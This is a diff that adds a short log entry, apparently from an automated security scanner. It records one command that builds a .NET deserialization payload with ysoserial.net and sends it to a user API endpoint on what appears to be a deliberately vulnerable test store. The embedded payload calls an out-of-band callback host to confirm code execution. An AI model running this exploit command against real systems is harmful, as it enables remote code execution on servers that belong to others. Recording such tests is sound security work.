@@ -1,0 +1,4 @@
+# command: timeout 300 sh -c 'ysoserial.net -g ObjectDataProvider -f Json.Net -c '"'"'curl -s http://oobc2b651f443c2.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/dnet'"'"' > /tmp/deser_net_$$.bin 2>/dev/null; curl -s -m 20 -o /dev/null -H '"'"'Content-Type: application/octet-stream'"'"' --data-binary @/tmp/deser_net_$$.bin https://duck-store.escape.tech/api/v1/users/4b7de2b0-df9e-4829-8994-a92be430dba2'
+# exit_code: 0
+# ---
+
